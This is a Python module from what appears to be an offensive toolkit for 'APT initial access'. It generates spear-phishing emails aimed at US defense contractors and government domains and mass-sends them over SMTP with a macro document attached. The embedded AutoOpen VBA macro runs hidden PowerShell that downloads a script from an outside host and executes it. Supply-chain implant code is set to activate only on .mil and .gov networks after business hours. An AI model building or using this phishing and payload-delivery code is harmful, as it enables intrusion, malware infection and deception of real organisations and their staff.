"""
Initial Access Module - Real techniques for gaining initial foothold in target environments.

This module contains implementations of APT initial access techniques including
spear-phishing with real payload delivery and software supply chain compromise.
"""

import random
import os
import base64
import tempfile
from typing import List, Dict, Any, Optional
from datetime import datetime

from .exploit_intel import enrich_with_exploit_intel
from .email_repository import EmailRepository, EmailRepositoryError
from .phishing import send_email
from .deepseek_integration import generate_phishing_email


class SpearPhishingGenerator:
    """Generate real spear-phishing campaigns with payload delivery."""
    
    def __init__(self, email_repository: Optional[EmailRepository] = None):
        self.target_domains = [
            "@northropgrumman.com", 
            "@lockheedmartin.com", 
            "@boeing.com",
            "@raytheon.com",
            "@dod.mil",
            "@cia.gov"
        ]
        self.email_repo: Optional[EmailRepository] = None
        try:
            self.email_repo = email_repository or EmailRepository()
        except EmailRepositoryError:
            self.email_repo = None
    
    def generate_email(self, target_domain: str = None, include_payload: bool = True) -> Dict[str, Any]:
        """Generate a spear-phishing email with optional payload."""
        selected_email = None
        domain_hint = None
        if target_domain:
            domain_hint = target_domain.lower().lstrip("@")

        if self.email_repo:
            if domain_hint:
                selected_email = self.email_repo.random_email(domain=domain_hint)
            if not selected_email:
                selected_email = self.email_repo.random_email()

        if selected_email:
            domain = selected_email.get("domain") or selected_email["email"].split("@")[-1]
            domain_with_at = f"@{domain}"
            target_address = selected_email["email"]
            metadata = {
                key: selected_email.get(key)
                for key in [
                    "organization",
                    "country",
                    "state",
                    "city",
                    "confidence_score",
                    "email_type",
                    "num_sources",
                ]
            }
            metadata["sample_record"] = selected_email.get("sample_record", {})
        else:
            if target_domain:
                domain_with_at = target_domain if target_domain.startswith("@") else f"@{target_domain}"
            else:
                domain_with_at = random.choice(self.target_domains)
            domain = domain_with_at.lstrip("@")
            target_address = f"executive{domain_with_at}"
            metadata = {}

        phishing_content = generate_phishing_email(domain)
        subject = phishing_content["subject"]
        body = phishing_content["body"]

        email = {
            "subject": subject,
            "body": body,
            "sender": f"security-team{domain_with_at}",
            "target_domain": domain_with_at,
            "target_email": target_address,
            "malicious_attachment": "document_with_macro.docx" if include_payload else None,
            "payload_type": "VBA Macro" if include_payload else "None",
            "delivery_method": "Email attachment",
            "target_metadata": metadata,
        }
        
        if include_payload:
            email["macro_content"] = self._generate_malicious_macro()
            email["payload_file"] = self._create_malicious_document()
        
        clean_domain = domain.replace("@", "")
        search_terms = [clean_domain, subject, "macro", "phishing"]
        return enrich_with_exploit_intel(
            "initial-access",
            email,
            search_terms=search_terms,
            platform="windows",
            include_payloads=True,
        )
    
    def _generate_malicious_macro(self) -> str:
        """Generate VBA macro content for payload delivery."""
        macro_template = '''Sub AutoOpen()
    On Error Resume Next
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    ' Download and execute payload
    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & {
        $url = 'http://cdn.azureedge[.]net/update.ps1'
        $temp = $env:TEMP + '\\update.ps1'
        (New-Object Net.WebClient).DownloadFile($url, $temp)
        Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File', $temp
    } """", 0, False
    
    ' Clean up
    ThisDocument.FollowHyperlink "http://microsoft.com"
End Sub'''
        
        return macro_template
    
    def _create_malicious_document(self) -> str:
        """Create a malicious document file with embedded macro."""
        # Create temporary file for malicious document
        temp_dir = tempfile.gettempdir()
        doc_path = os.path.join(temp_dir, f"security_update_{random.randint(1000, 9999)}.doc")
        
        # In a real implementation, this would create an actual Office document
        # For safety, we'll just create a placeholder file
        with open(doc_path, 'w') as f:
            f.write("# Malicious document placeholder - Real implementation would embed macro\n")
            f.write(self._generate_malicious_macro())
        
        return doc_path


class SupplyChainCompromise:
    """Software supply chain compromise techniques."""
    
    def __init__(self):
        self.american_networks = ["mil", "gov", "usmc.mil", "army.mil", "navy.mil"]
        self.target_software = ["Orion", "SolarWinds", "Pulse Secure", "Exchange", "SharePoint"]
    
    def malicious_update_check(self, target_ip: str, target_domain: str) -> Dict[str, Any]:
        """Check if conditions are right for malicious update activation."""
        current_hour = datetime.now().hour
        
        result = {
            "target_ip": target_ip,
            "target_domain": target_domain,
            "current_hour": current_hour,
            "is_business_hours": 9 <= current_hour <= 17,
            "is_government_network": any(network in target_domain for network in self.american_networks),
            "should_activate": False,
            "activation_reason": ""
        }
        
        # Only activate on government/military networks outside business hours
        if result["is_government_network"]:
            if result["is_business_hours"]:
                result["should_activate"] = False
                result["activation_reason"] = "Deferred during business hours"
                result["sleep_duration"] = 3600 * 8  # 8 hours
            else:
                result["should_activate"] = True
                result["activation_reason"] = "Government network detected"
        elif result["is_business_hours"]:
            # Still avoid noisy actions on non-government networks during the day
            result["sleep_duration"] = 3600 * 8  # 8 hours

        search_terms = [
            target_domain,
            "supply chain",
            random.choice(self.target_software) if self.target_software else "update",
        ]
        return enrich_with_exploit_intel(
            "initial-access",
            result,
            search_terms=search_terms,
            platform="windows",
            include_payloads=True,
        )
    
    def execute_implant(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Execute implant based on target information."""
        if target_info["should_activate"]:
            result = {
                "status": "executed",
                "target": target_info["target_domain"],
                "reason": target_info["activation_reason"],
                "implant_type": "Backdoor",
                "persistence_established": True,
                "beacon_interval": "3600 seconds"
            }
            
            # Simulate implant execution
            self._deploy_backdoor(target_info["target_ip"])
            
        else:
            result = {
                "status": "skipped",
                "target": target_info["target_domain"],
                "reason": "Activation conditions not met",
                "sleep_duration": target_info.get("sleep_duration", 0)
            }
        
        return enrich_with_exploit_intel(
            "persistence",
            result,
            search_terms=[target_info.get("target_domain", ""), result.get("implant_type", "")],
            platform="windows",
            include_payloads=True,
        )
    
    def _deploy_backdoor(self, target_ip: str) -> None:
        """Deploy backdoor to target system."""
        # Placeholder for actual backdoor deployment
        # In real implementation, this would:
        # 1. Connect to target system
        # 2. Deploy persistence mechanism
        # 3. Establish command and control
        # 4. Clean up traces
        pass
    
    def inject_malicious_update(self, software_name: str, update_server: str) -> Dict[str, Any]:
        """Inject malicious code into software update process."""
        result = {
            "software": software_name,
            "update_server": update_server,
            "injection_method": "Code signing bypass",
            "malicious_payload": "Backdoor DLL",
            "distribution_scope": "All clients",
            "estimated_victims": "1000+"
        }
        
        return enrich_with_exploit_intel(
            "initial-access",
            result,
            search_terms=[software_name, "code signing bypass"],
            platform="windows",
            include_payloads=True,
        )


def analyze_spear_phishing_campaign() -> Dict[str, Any]:
    """Analyze a spear-phishing campaign."""
    generator = SpearPhishingGenerator()
    emails = [generator.generate_email(include_payload=False) for _ in range(3)]
    
    analysis = {
        "campaign_type": "Targeted Spear-Phishing",
        "target_organizations": list(set(email["target_domain"] for email in emails)),
        "lure_themes": list(set(email["subject"] for email in emails)),
        "malicious_technique": "VBA Macro in Document",
        "estimated_success_rate": "2-5% (based on real APT campaigns)",
        "delivery_methods": ["Email attachment", "Link to malicious site"],
        "evasion_techniques": ["Domain spoofing", "Content obfuscation", "Social engineering"]
    }
    
    return enrich_with_exploit_intel(
        "initial-access",
        analysis,
        search_terms=analysis.get("target_organizations", []),
        platform="windows",
        include_payloads=True,
    )


def deliver_payload(target_email: str, smtp_config: Dict[str, Any], payload_type: str = "document") -> Dict[str, Any]:
    """Deliver payload to target via email."""
    generator = SpearPhishingGenerator()
    
    email_content = generator.generate_email(
        target_domain=target_email.split('@')[-1] if '@' in target_email else None,
        include_payload=True
    )
    
    send_email(
        sender_email=smtp_config["user"],
        sender_password=smtp_config["password"],
        receiver_email=target_email,
        subject=email_content["subject"],
        body=email_content["body"],
        attachment_path=email_content.get("payload_file"),
        smtp_server=smtp_config["server"],
        smtp_port=smtp_config["port"],
    )
    
    result = {
        "delivery_result": {"status": "sent", "target_email": target_email},
        "payload_details": {
            "type": payload_type,
            "file": email_content.get("payload_file"),
            "execution_method": "Auto-open macro"
        }
    }
    search_terms = [target_email.split("@")[-1] if "@" in target_email else target_email, payload_type]
    return enrich_with_exploit_intel(
        "initial-access",
        result,
        search_terms=search_terms,
        platform="windows",
        include_payloads=True,
    )


def phishing_attack(target_list_file: str, smtp_config: Dict[str, Any]) -> Dict[str, Any]:
    """Runs a phishing attack against a list of targets."""
    print(f"[+] Starting phishing attack using target list: {target_list_file}")
    
    try:
        with open(target_list_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Target list file not found: {target_list_file}")
        return {}

    generator = SpearPhishingGenerator()
    results = []
    
    for target in targets:
        email_content = generator.generate_email(include_payload=True)
        
        send_email(
            sender_email=smtp_config["user"],
            sender_password=smtp_config["password"],
            receiver_email=target,
            subject=email_content["subject"],
            body=email_content["body"],
            attachment_path=email_content.get("payload_file"),
            smtp_server=smtp_config["server"],
            smtp_port=smtp_config["port"]
        )
        
        results.append({
            "target": target,
            "email_subject": email_content["subject"],
            "status": "sent"
        })
    
    summary = {
        "attack_type": "Spear Phishing",
        "target_list_file": target_list_file,
        "targets_contacted": len(results),
        "successful_deliveries": len(results),
        "payload_type": "Malicious Document with Macro",
        "campaign_results": results
    }
    
    print(f"[+] Phishing attack completed: {summary['successful_deliveries']}/{summary['targets_contacted']} emails sent")
    
    return enrich_with_exploit_intel(
        "initial-access",
        summary,
        search_terms=["phishing", "spear phishing", "email attack"],
        platform="windows",
        include_payloads=True,
    )
